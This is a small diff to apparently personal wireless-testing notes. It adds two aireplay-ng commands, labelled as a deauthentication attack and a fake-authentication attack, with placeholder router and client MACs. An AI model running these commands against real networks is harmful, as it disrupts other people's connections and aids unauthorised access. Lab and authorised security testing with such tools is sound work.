@@ -23,3 +23,12 @@ sudo systemctl start NetworkManager.service
 sudo systemctl start wpa_supplicant.service
 ```
 
+> ### Deauth attack
+```sh
+aireplay-ng --deauth 40 -a RMAC -c CMAC wlan1
+```
+
+> ### Fakeauth attack
+```sh
+aireplay-ng --fakeauth 4 -a RMAC -h 24:2F:D0:DA:04:DC wlan1
+```
